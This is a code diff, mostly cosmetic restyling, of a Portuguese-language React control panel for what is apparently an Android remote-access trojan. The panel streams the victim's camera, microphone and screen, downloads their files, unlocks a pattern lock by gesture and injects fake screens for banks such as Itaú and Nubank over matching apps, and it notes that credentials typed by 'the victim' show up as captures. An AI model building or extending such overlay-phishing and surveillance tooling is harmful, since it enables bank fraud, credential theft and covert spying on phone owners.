                             <span className="px-1.5 py-0.5 bg-emerald-950/65 border border-emerald-500/20 text-emerald-400 text-[8px] rounded font-mono font-bold uppercase tracking-wide">
                               {file.label || 'DOCUMENTO'}
                             </span>
-                            <span className="text-[8px] text-slate-500 font-mono">
+                            <span className="text-[8px] text-[#8b8b94] font-mono">
                               {new Date(file.timestamp).toLocaleTimeString()}
                             </span>
                           </div>
@@ -9401,9 +9465,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 link.href = `data:${file.mimeType};base64,${file.data}`;
                                 link.download = file.fileName || 'arquivo';
                                 link.click();
-                                addLog(`📥 Arquivo baixado: ${file.fileName}`);
+                                addLog(` Arquivo baixado: ${file.fileName}`);
                               }}
-                              className="w-full py-1.5 bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold text-[9px] rounded-lg transition-colors flex items-center justify-center gap-1 shadow shadow-emerald-900/30"
+                              className="w-full py-1.5 bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold text-[9px] rounded-md transition-colors flex items-center justify-center gap-1 shadow shadow-emerald-900/30"
                             >
                               <Download className="w-3 h-3" />
                               Baixar
@@ -9424,11 +9488,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     return (
                       <div
                         key={i}
-                        className="group/list relative bg-gradient-to-r from-slate-900/80 to-[#300b04]/80 border border-emerald-500/10 hover:border-emerald-500/35 rounded-xl p-3 flex items-center justify-between gap-3 transition-all duration-300"
+                        className="group/list relative bg-gradient-to-r from-[#121214]/80 to-[#300b04]/80 border border-emerald-500/10 hover:border-emerald-500/35 rounded-md p-3 flex items-center justify-between gap-3 transition-all duration-300"
                       >
                         <div className="flex items-center gap-3 min-w-0">
                           {/* Miniatura ou Iícone */}
-                          <div className="w-10 h-10 rounded-lg bg-[#170403] border border-slate-950 overflow-hidden flex items-center justify-center flex-shrink-0 shadow-inner">
+                          <div className="w-10 h-10 rounded-md bg-[#170403] border border-slate-950 overflow-hidden flex items-center justify-center flex-shrink-0 shadow-inner">
                             {isImg && file.data ? (
                               <img
                                 src={`data:${file.mimeType};base64,${file.data}`}
@@ -9441,7 +9505,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               />
                             ) : (
                               <span className="text-xl">
-                                {isPdf ? '“„' : '“'}
+                                {isPdf ? '' : ''}
                               </span>
                             )}
                           </div>
@@ -9455,7 +9519,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               <span className="px-1.5 py-0.5 bg-emerald-950/60 border border-emerald-500/20 text-emerald-400 text-[8px] rounded font-mono font-bold">
                                 {file.label || 'DOCUMENTO'}
                               </span>
-                              <span className="text-[9px] text-slate-500 font-mono">
+                              <span className="text-[9px] text-[#8b8b94] font-mono">
                                 {new Date(file.timestamp).toLocaleTimeString()}
                               </span>
                             </div>
@@ -9470,7 +9534,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 setLightboxImage(`data:${file.mimeType};base64,${file.data}`);
                                 setLightboxName(file.fileName || 'Imagem');
                               }}
-                              className="p-1.5 bg-[#200703] hover:bg-slate-800 text-emerald-400 border border-emerald-500/20 hover:border-emerald-500/40 rounded-lg transition-colors"
+                              className="p-1.5 bg-[#200703] hover:bg-[#24242a] text-emerald-400 border border-emerald-500/20 hover:border-emerald-500/40 rounded-md transition-colors"
                               title="Visualizar"
                             >
                               <Eye className="w-3 h-3" />
@@ -9482,9 +9546,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               link.href = `data:${file.mimeType};base64,${file.data}`;
                               link.download = file.fileName || 'arquivo';
                               link.click();
-                              addLog(`📥 Arquivo baixado: ${file.fileName}`);
+                              addLog(` Arquivo baixado: ${file.fileName}`);
                             }}
-                            className="p-1.5 bg-emerald-600 hover:bg-emerald-500 text-slate-950 rounded-lg transition-colors font-bold"
+                            className="p-1.5 bg-emerald-600 hover:bg-emerald-500 text-slate-950 rounded-md transition-colors font-bold"
                             title="Download"
                           >
                             <Download className="w-3 h-3" />
@@ -9504,16 +9568,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
                 </div>
       
-      {/* 📷 MODAL DE CÂMERA */}
+      {/*  MODAL DE CÂMERA */}
       {showCameraModal && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => {
           setShowCameraModal(false);
           toggleCamera();
         }}>
-          <div className="bg-[#440e05] rounded-lg p-6 max-w-2xl w-full mx-4" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-[#121214] rounded-md p-6 max-w-2xl w-full mx-4" onClick={(e) => e.stopPropagation()}>
             <div className="flex items-center justify-between mb-4">
               <h2 className="text-2xl font-bold text-white flex items-center">
-                <span className="text-3xl mr-3">📷</span>
+                <span className="text-3xl mr-3"></span>
                 Cmera em Tempo Real
               </h2>
               <button
@@ -9527,7 +9591,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </button>
               </div>
 
-            <div className="bg-black rounded-lg p-2">
+            <div className="bg-black rounded-md p-2">
               <canvas
                 ref={cameraCanvasRef}
                 className="w-full h-auto rounded"
@@ -9542,27 +9606,27 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             
             <div className="mt-4 flex items-center justify-between">
               <div className="flex items-center space-x-2 text-sm text-gray-300">
-                <span>🎬 Cmera:</span>
+                <span> Cmera:</span>
                 <span className="font-bold">{currentCamera === 'front' ? 'FRONTAL' : 'TRASEIRA'}</span>
               </div>
                 <button
                 onClick={switchCamera}
-                className="flex items-center space-x-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
+                className="flex items-center space-x-2 px-4 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md transition-colors"
                 >
-                <span>🔄</span>
+                <span></span>
                 <span>Alternar Cmera</span>
                 </button>
               </div>
             </div>
         </div>
       )}
-      {/* 📥 MODAL DE CAPTURAS CUSTOMIZADAS */}
+      {/*  MODAL DE CAPTURAS CUSTOMIZADAS */}
       {showCustomCapturesModal && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowCustomCapturesModal(false)}>
-          <div className="bg-[#440e05] border border-teal-500/30 rounded-2xl p-6 max-w-2xl w-full mx-4 shadow-2xl shadow-teal-500/10 flex flex-col max-h-[85vh]" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-[#121214] border border-teal-500/30 rounded-md p-6 max-w-2xl w-full mx-4 shadow-2xl shadow-teal-500/10 flex flex-col max-h-[85vh]" onClick={(e) => e.stopPropagation()}>
             <div className="flex items-center justify-between mb-4 flex-shrink-0">
               <h2 className="text-xl font-bold text-white flex items-center gap-2">
-                <span className="text-2xl">📥</span>
+                <span className="text-2xl"></span>
                 Capturas de Telas Customizadas
               </h2>
               <button
@@ -9577,39 +9641,39 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               {customCaptures.length === 0 ? (
                 <div className="text-center py-12">
                   <p className="text-slate-400 text-sm">Nenhuma captura customizada recebida até o momento.</p>
-                  <p className="text-slate-500 text-xs mt-1.5">Injete uma tela customizada no dispositivo para testar.</p>
+                  <p className="text-[#8b8b94] text-xs mt-1.5">Injete uma tela customizada no dispositivo para testar.</p>
                 </div>
               ) : (
                 customCaptures.map((cap) => (
-                  <div key={cap.id} className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 relative overflow-hidden group">
+                  <div key={cap.id} className="bg-[#121214]/60 border border-[#24242a] rounded-md p-4 relative overflow-hidden group">
                     <div className="flex justify-between items-start mb-2.5">
                       <div>
                         <span className="px-2 py-0.5 bg-teal-500/10 border border-teal-500/20 text-teal-400 rounded text-[10px] font-bold font-mono">
                           {cap.project_name || "Custom Screen"}
                         </span>
-                        <div className="text-[10px] text-slate-500 mt-1 font-mono">
+                        <div className="text-[10px] text-[#8b8b94] mt-1 font-mono">
                           ID do Projeto: {cap.project_id}
                         </div>
                       </div>
                       <div className="flex items-center gap-2">
-                        <span className="text-[10px] text-slate-500 font-mono">
+                        <span className="text-[10px] text-[#8b8b94] font-mono">
                           {new Date(cap.timestamp).toLocaleString()}
                         </span>
                         <button
                           onClick={() => handleDeleteCustomCapture(cap.id)}
-                          className="text-red-400 hover:text-red-300 hover:bg-red-500/10 p-1 rounded transition-colors"
+                          className="text-[#ef4444] hover:text-[#ef4444] hover:bg-[#ef4444]/10 p-1 rounded transition-colors"
                           title="Excluir captura"
                         >
-                          —‘
+                          
                         </button>
                       </div>
                     </div>
 
-                    <div className="bg-slate-950/60 border border-slate-800/80 rounded-lg p-3 space-y-2">
+                    <div className="bg-slate-950/60 border border-[#24242a]/80 rounded-md p-3 space-y-2">
                       {Object.entries(cap.captured_data || {}).map(([key, val]) => {
                         if (key.startsWith('_')) return null; // Oculta propriedades internas como _projectId, etc.
                         return (
-                          <div key={key} className="flex flex-col sm:flex-row sm:items-center justify-between text-xs gap-1 border-b border-slate-800/30 pb-1.5 last:border-0 last:pb-0">
+                          <div key={key} className="flex flex-col sm:flex-row sm:items-center justify-between text-xs gap-1 border-b border-[#24242a]/30 pb-1.5 last:border-0 last:pb-0">
                             <span className="font-bold text-slate-400 font-mono select-none">{key}:</span>
                             <div className="flex items-center gap-1.5">
                               <span className="text-white font-mono break-all">{String(val)}</span>
@@ -9618,7 +9682,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   navigator.clipboard.writeText(String(val));
                                   addLog(`Copiado: ${key} = ${val}`);
                                 }}
-                                className="text-[10px] bg-slate-800 hover:bg-slate-700 text-teal-400 px-1.5 py-0.5 rounded transition-all active:scale-95"
+                                className="text-[10px] bg-[#24242a] hover:bg-[#2a2a31] text-teal-400 px-1.5 py-0.5 rounded transition-all active:scale-95"
                               >
                                 Copiar
                               </button>
@@ -9634,13 +9698,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           </div>
         </div>
       )}
-      {/* 💉 MODAL DE INJEÇO */}
+      {/*  MODAL DE INJEÇO */}
       {showInjectionModal && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowInjectionModal(false)}>
-          <div className="bg-[#2e0803] border border-cyan-500/40 rounded-2xl p-6 max-w-lg w-full mx-4 shadow-2xl shadow-cyan-500/20" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-[#2e0803] border border-[#2a2a31]/40 rounded-md p-6 max-w-lg w-full mx-4 shadow-2xl shadow-[#ef4444]/20" onClick={(e) => e.stopPropagation()}>
             <div className="flex items-center justify-between mb-6">
               <h2 className="text-2xl font-bold text-white flex items-center gap-2">
-                <span className="text-3xl">💉</span>
+                <span className="text-3xl"></span>
                 Injetar Tela Customizada (APK Studio)
               </h2>
               <button
@@ -9663,15 +9727,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     <p className="text-slate-300 text-sm mb-4">
                       Nenhum projeto encontrado no APK Studio.
                     </p>
-                    <p className="text-slate-500 text-xs mb-6">
-                      Crie telas customizadas (ex:🏦 Itaú,🏦 Nubank, etc.) no APK Studio primeiro para poder injetá-las no dispositivo.
+                    <p className="text-[#8b8b94] text-xs mb-6">
+                      Crie telas customizadas (ex: Itaú, Nubank, etc.) no APK Studio primeiro para poder injetá-las no dispositivo.
                     </p>
                     <button
                       onClick={() => {
                         setShowInjectionModal(false);
                         navigate('/apk-studio');
                       }}
-                      className="px-4 py-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white rounded-lg font-semibold transition-colors"
+                      className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md font-semibold transition-colors"
                     >
                       Ir para o APK Studio
                     </button>
@@ -9685,23 +9749,23 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               return (
                 <div className="space-y-4">
                   {/* TABS HEADER */}
-                  <div className="flex border-b border-blue-500/10 mb-4">
+                  <div className="flex border-b border-[#2a2a31]/10 mb-4">
                     <button
                       type="button"
-                      className={`flex-1 pb-2 font-semibold text-sm transition-all ${injectionModalTab === 'inject' ? 'border-b-2 border-cyan-400 text-cyan-300 font-bold' : 'text-slate-400 hover:text-white'}`}
+                      className={`flex-1 pb-2 font-semibold text-sm transition-all ${injectionModalTab === 'inject' ? 'border-b-2 border-[#3a3a44] text-[#ef4444] font-bold' : 'text-slate-400 hover:text-white'}`}
                       onClick={() => setInjectionModalTab('inject')}
                     >
-                      💉 Injetar Agora
+                       Injetar Agora
                     </button>
                     <button
                       type="button"
-                      className={`flex-1 pb-2 font-semibold text-sm transition-all ${injectionModalTab === 'mapping' ? 'border-b-2 border-cyan-400 text-cyan-300 font-bold' : 'text-slate-400 hover:text-white'}`}
+                      className={`flex-1 pb-2 font-semibold text-sm transition-all ${injectionModalTab === 'mapping' ? 'border-b-2 border-[#3a3a44] text-[#ef4444] font-bold' : 'text-slate-400 hover:text-white'}`}
                       onClick={() => {
                         setInjectionModalTab('mapping');
                         fetchOverlayMappings();
                       }}
                     >
-                      š™ Gatilhos Automáticos ({overlayMappings.length})
+                      š Gatilhos Automáticos ({overlayMappings.length})
                     </button>
                   </div>
 
@@ -9715,7 +9779,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             setSelectedProjectId(e.target.value);
                             setSelectedScreenIndex(null);
                           }}
-                          className="w-full bg-[#280803] border border-blue-500/20 rounded-lg px-3 py-2 text-white focus:outline-none focus:border-purple-500"
+                          className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-white focus:outline-none focus:border-[#f87171]"
                         >
                           <option value="">-- Escolha um Projeto --</option>
                           {projects.map((p) => (
@@ -9738,14 +9802,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   key={screen.id}
                                   type="button"
                                   onClick={() => setSelectedScreenIndex(idx)}
-                                  className={`text-left px-4 py-3 rounded-lg border text-sm font-medium transition-all ${
+                                  className={`text-left px-4 py-3 rounded-md border text-sm font-medium transition-all ${
                                     selectedScreenIndex === idx
-                                      ? 'bg-purple-600/30 border-purple-500 text-white'
-                                      : 'bg-[#280803]/50 border-blue-500/10 text-slate-300 hover:border-blue-500/30 hover:text-white'
+                                      ? 'bg-[#84cc16]/30 border-[#f87171] text-white'
+                                      : 'bg-[#280803]/50 border-[#2a2a31]/10 text-slate-300 hover:border-[#2a2a31]/30 hover:text-white'
                                   }`}
                                 >
                                   <div className="font-bold">{screen.name}</div>
-                                  <div className="text-slate-500 text-xs mt-0.5">Elementos: {screen.elements?.length || 0} | Fundo: {screen.backgroundColor}</div>
+                                  <div className="text-[#8b8b94] text-xs mt-0.5">Elementos: {screen.elements?.length || 0} | Fundo: {screen.backgroundColor}</div>
                                 </button>
                               ))}
                             </div>
@@ -9754,19 +9818,19 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       )}
 
                       {selectedProject && (
-                        <div className="bg-teal-950/20 border border-teal-500/30 rounded-lg p-3 text-xs text-teal-400 font-sans flex items-start gap-2">
-                          <span className="text-base select-none">💡</span>
+                        <div className="bg-teal-950/20 border border-teal-500/30 rounded-md p-3 text-xs text-teal-400 font-sans flex items-start gap-2">
+                          <span className="text-base select-none"></span>
                           <div>
                             <strong>Nota Importante:</strong> Qualquer credencial ou senha digitada pela vítima nessa tela customizada será exibida na seção <strong className="underline text-teal-300 font-bold">Capturas Customizadas</strong> na barra lateral esquerda.
                           </div>
                         </div>
                       )}
 
-                      <div className="flex justify-end gap-3 pt-4 border-t border-blue-500/10">
+                      <div className="flex justify-end gap-3 pt-4 border-t border-[#2a2a31]/10">
                         <button
                           type="button"
                           onClick={() => setShowInjectionModal(false)}
-                          className="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-semibold transition-colors"
+                          className="px-4 py-2 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-semibold transition-colors"
                         >
                           Cancelar
                         </button>
@@ -9780,17 +9844,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setShowInjectionModal(false);
                             }
                           }}
-                          className="px-4 py-2 bg-purple-600 hover:bg-purple-700 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-lg font-semibold transition-colors flex items-center gap-2"
+                          className="px-4 py-2 bg-[#84cc16] hover:bg-purple-700 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-md font-semibold transition-colors flex items-center gap-2"
                         >
-                          <span>💉</span> Injetar Agora
+                          <span></span> Injetar Agora
                         </button>
                       </div>
                     </div>
                   ) : (
                     <div className="space-y-4">
                       {/* Form de adicionar mapping */}
-                      <div className="bg-slate-900/60 p-4 rounded-xl border border-blue-500/10 space-y-3">
-                        <h3 className="text-xs font-black uppercase text-purple-400 tracking-wider">Novo Auto-Gatilho</h3>
+                      <div className="bg-[#121214]/60 p-4 rounded-md border border-[#2a2a31]/10 space-y-3">
+                        <h3 className="text-xs font-black uppercase text-[#f87171] tracking-wider">Novo Auto-Gatilho</h3>
                         
                         <div>
                           <label className="block text-xs text-slate-400 mb-1">Selecionar App do Alvo</label>
@@ -9799,19 +9863,19 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           <div className="flex gap-1.5 mb-2">
                             <input
                               type="text"
-                              placeholder="” Buscar app..."
+                              placeholder=" Buscar app..."
                               value={mappingSearch}
                               onChange={(e) => setMappingSearch(e.target.value)}
-                              className="flex-1 bg-[#280803] border border-blue-500/20 rounded-lg px-2.5 py-1.5 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-purple-500"
+                              className="flex-1 bg-[#280803] border border-[#2a2a31]/20 rounded-md px-2.5 py-1.5 text-xs text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#f87171]"
                             />
-                            <div className="flex gap-0.5 border border-blue-500/20 rounded-lg overflow-hidden bg-[#280803]">
+                            <div className="flex gap-0.5 border border-[#2a2a31]/20 rounded-md overflow-hidden bg-[#280803]">
                               <button
                                 type="button"
                                 onClick={() => setMappingFilter('banks')}
                                 className={`px-2 text-[10px] font-bold transition-all ${
                                   mappingFilter === 'banks' 
-                                    ? 'bg-purple-600 text-white shadow-[0_0_10px_rgba(220,38,38,0.3)]' 
-                                    : 'text-slate-400 hover:text-white hover:bg-slate-800'
+                                    ? 'bg-[#84cc16] text-white shadow-[0_0_10px_rgba(239,68,68,0.3)]' 
+                                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]'
                                 }`}
                               >
                                  Bancos
@@ -9821,22 +9885,22 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 onClick={() => setMappingFilter('user')}
                                 className={`px-2 text-[10px] font-bold transition-all ${
                                   mappingFilter === 'user' 
-                                    ? 'bg-blue-600 text-white' 
-                                    : 'text-slate-400 hover:text-white hover:bg-slate-800'
+                                    ? 'bg-[#ef4444] text-white' 
+                                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]'
                                 }`}
                               >
-                                👤 Usuário
+                                 Usuário
                               </button>
                               <button
                                 type="button"
                                 onClick={() => setMappingFilter('all')}
                                 className={`px-2 text-[10px] font-bold transition-all ${
                                   mappingFilter === 'all' 
-                                    ? 'bg-blue-600 text-white' 
-                                    : 'text-slate-400 hover:text-white hover:bg-slate-800'
+                                    ? 'bg-[#ef4444] text-white' 
+                                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]'
                                 }`}
                               >
-                                📋 Todos
+                                 Todos
                               </button>
                             </div>
                           </div>
@@ -9849,7 +9913,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 setCustomMappingPackage('');
                               }
                             }}
-                            className="w-full bg-[#280803] border border-blue-500/20 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500"
+                            className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                           >
                             <option value="">-- Selecione o App ({filteredAppsForMapping.length} filtrados) --</option>
                             {filteredAppsForMapping.map((app) => (
@@ -9869,7 +9933,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               placeholder="Ex: com.banco.original"
                               value={customMappingPackage}
                               onChange={(e) => setCustomMappingPackage(e.target.value)}
-                              className="w-full bg-[#280803] border border-blue-500/20 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500"
+                              className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                             />
                           </div>
                         )}
@@ -9883,7 +9947,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 setSelectedProjectId(e.target.value);
                                 setSelectedScreenIndex(null);
                               }}
-                              className="w-full bg-[#280803] border border-blue-500/20 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500"
+                              className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                             >
                               <option value="">-- Escolha --</option>
                               {projects.map((p) => (
@@ -9898,7 +9962,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               <select
                                 value={selectedScreenIndex !== null ? selectedScreenIndex : ''}
                                 onChange={(e) => setSelectedScreenIndex(e.target.value !== '' ? Number(e.target.value) : null)}
-                                className="w-full bg-[#280803] border border-blue-500/20 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500"
+                                className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                               >
                                 <option value="">-- Escolha --</option>
                                 {screens.map((screen: any, idx: number) => (
@@ -9924,9 +9988,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             setSelectedProjectId(null);
                             setSelectedScreenIndex(null);
                           }}
-                          className="w-full py-2 bg-purple-600 hover:bg-purple-700 disabled:opacity-50 text-white rounded-lg font-bold text-xs transition-all shadow-[0_0_10px_rgba(220,38,38,0.3)]"
+                          className="w-full py-2 bg-[#84cc16] hover:bg-purple-700 disabled:opacity-50 text-white rounded-md font-bold text-xs transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)]"
                         >
-                          💾 Configurar Auto-Gatilho
+                           Configurar Auto-Gatilho
                         </button>
                       </div>
 
@@ -9934,19 +9998,19 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       <div>
                         <h3 className="text-xs font-black uppercase text-slate-400 tracking-wider mb-2">Gatilhos Ativos</h3>
                         {overlayMappings.length === 0 ? (
-                          <p className="text-slate-500 text-xs italic text-center py-4 bg-black/10 rounded-lg border border-dashed border-blue-500/10">Nenhum gatilho configurado para este aparelho.</p>
+                          <p className="text-[#8b8b94] text-xs italic text-center py-4 bg-black/10 rounded-md border border-dashed border-[#2a2a31]/10">Nenhum gatilho configurado para este aparelho.</p>
                         ) : (
                           <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                             {overlayMappings.map((m) => (
-                              <div key={m.id} className="flex items-center justify-between p-2.5 bg-[#280803]/50 border border-blue-500/10 rounded-lg text-xs hover:border-blue-500/30 transition-all">
+                              <div key={m.id} className="flex items-center justify-between p-2.5 bg-[#280803]/50 border border-[#2a2a31]/10 rounded-md text-xs hover:border-[#2a2a31]/30 transition-all">
                                 <div className="min-w-0 flex-1 mr-2">
                                   <span className="font-bold text-slate-200 block truncate">{m.package_name}</span>
-                                  <span className="text-[10px] text-slate-500">Tela: {m.screen_name}</span>
+                                  <span className="text-[10px] text-[#8b8b94]">Tela: {m.screen_name}</span>
                                 </div>
                                 <button
                                   type="button"
                                   onClick={() => deleteOverlayMapping(m.id)}
-                                  className="px-2 py-1 bg-red-950/60 border border-red-500/30 text-red-400 hover:bg-red-900/60 rounded font-bold transition-all text-[10px]"
+                                  className="px-2 py-1 bg-[#121214]/60 border border-[#2a2a31]/30 text-[#ef4444] hover:bg-[#1a1a1e]/60 rounded font-bold transition-all text-[10px]"
                                 >
                                   Remover
                                 </button>
@@ -9964,16 +10028,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
 
-      {/* 🎤 MODAL DE MICROFONE */}
+      {/*  MODAL DE MICROFONE */}
       {showMicrophoneModal && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => {
           setShowMicrophoneModal(false);
           toggleMicrophone();
         }}>
-          <div className="bg-[#440e05] rounded-lg p-6 max-w-md w-full mx-4" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-[#121214] rounded-md p-6 max-w-md w-full mx-4" onClick={(e) => e.stopPropagation()}>
             <div className="flex items-center justify-between mb-4">
               <h2 className="text-2xl font-bold text-white flex items-center">
-                <span className="text-3xl mr-3">🎤</span>
+                <span className="text-3xl mr-3"></span>
                 Microfone em Tempo Real
               </h2>
               <button
@@ -9987,13 +10051,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </button>
             </div>
             
-            <div className="bg-gradient-to-br from-red-900/30 to-slate-950/30 rounded-lg p-8">
+            <div className="bg-gradient-to-br from-[#1a1a1e]/30 to-slate-950/30 rounded-md p-8">
               <div className="flex flex-col items-center justify-center space-y-4">
                 <div className="relative">
-                  <div className="w-32 h-32 bg-red-600 rounded-full flex items-center justify-center animate-pulse">
-                    <span className="text-6xl">🎤</span>
+                  <div className="w-32 h-32 bg-[#ef4444] rounded-full flex items-center justify-center animate-pulse">
+                    <span className="text-6xl"></span>
           </div>
-                  <div className="absolute inset-0 bg-red-500/30 rounded-full animate-ping"></div>
+                  <div className="absolute inset-0 bg-[#ef4444]/30 rounded-full animate-ping"></div>
         </div>
                 
                 <div className="text-center">
@@ -10025,31 +10089,31 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
       
-      {/* –¥ MODAL EXPANDIDO - VNC + Screen Reader lado a lado */}
+      {/* ¥ MODAL EXPANDIDO - VNC + Screen Reader lado a lado */}
       {isExpandedMode && (
         <div className="fixed inset-0 bg-black z-[200] flex flex-col">
           {/* Header do modo expandido */}
-          <div className="flex items-center justify-between px-4 py-2 bg-[#440e05] border-b border-blue-500/20">
+          <div className="flex items-center justify-between px-4 py-2 bg-[#121214] border-b border-[#2a2a31]/20">
             <div className="flex items-center space-x-4">
-              <h2 className="text-white font-bold">–¥ Modo Expandido - {device?.model}</h2>
-              <div className={`px-2 py-1 rounded text-xs ${device?.is_online ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
-                {device?.is_online ? '— Online' : '— Offline'}
+              <h2 className="text-white font-bold">¥ Modo Expandido - {device?.model}</h2>
+              <div className={`px-2 py-1 rounded text-xs ${device?.is_online ? 'bg-green-500/20 text-green-400' : 'bg-[#ef4444]/20 text-[#ef4444]'}`}>
+                {device?.is_online ? ' Online' : ' Offline'}
               </div>
             </div>
             <button
               onClick={() => setIsExpandedMode(false)}
-              className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition-all"
+              className="px-4 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md font-semibold transition-all"
             >
-              ✕ Fechar
+               Fechar
             </button>
           </div>
           
           {/* Conteúdo lado a lado */}
           <div className="flex-1 flex gap-4 p-4 overflow-hidden">
             {/* VNC Normal */}
-            <div className="flex-1 flex flex-col bg-[#290903] rounded-lg border border-blue-500 overflow-hidden">
-              <div className="px-3 py-2 bg-blue-600/20 border-b border-blue-500/50">
-                <span className="text-cyan-300 font-bold text-sm">📺 VNC Normal</span>
+            <div className="flex-1 flex flex-col bg-[#1a1a1e] rounded-md border border-[#2a2a31] overflow-hidden">
+              <div className="px-3 py-2 bg-[#ef4444]/20 border-b border-[#2a2a31]/50">
+                <span className="text-[#ef4444] font-bold text-sm"> VNC Normal</span>
               </div>
               <div className="flex-1 flex items-center justify-center overflow-hidden p-2">
                 {isCaptureEnabled ? (
@@ -10063,10 +10127,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   />
                 ) : (
                   <div className="text-center text-gray-400">
-                    <p className="mb-2">📺 Captura não ativada</p>
+                    <p className="mb-2"> Captura não ativada</p>
                     <button
                       onClick={toggleCapture}
-                      className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm"
+                      className="px-4 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm"
                     >
                       Iniciar Captura
                     </button>
@@ -10076,7 +10140,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             </div>
 
             {/* Screen Reader V2 Expandido - Canvas + Lista de Elementos */}
-            <div className="flex-1 flex flex-col bg-[#290903] rounded-lg border border-green-500 overflow-hidden" style={{ minWidth: 0 }}>
+            <div className="flex-1 flex flex-col bg-[#1a1a1e] rounded-md border border-green-500 overflow-hidden" style={{ minWidth: 0 }}>
               <div className="px-3 py-2 bg-green-600/20 border-b border-green-500/50 flex items-center justify-between">
                 <span className="text-green-300 font-bold text-sm">
                   <Eye className="w-4 h-4 inline mr-1" />
@@ -10098,12 +10162,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       sendCommand({ action: 'PATH_GESTURE', path: JSON.stringify(rawPoints) });
                       setPatternInput(patternStr);
                       setCapturedPattern(patternStr);
-                      addLog(`⚡ Preset L (1-4-7-8-9) executado com sucesso`);
+                      addLog(` Preset L (1-4-7-8-9) executado com sucesso`);
                     }}
-                    className="px-2 py-1 bg-cyan-600 hover:bg-cyan-500 text-white rounded text-xs font-bold transition flex items-center"
+                    className="px-2 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded text-xs font-bold transition flex items-center"
                     title="Executar padrão L (1-4-7-8-9) no celular"
                   >
-                    🔓 Desbloquear Padrão L (1-4-7-8-9)
+                     Desbloquear Padrão L (1-4-7-8-9)
                   </button>
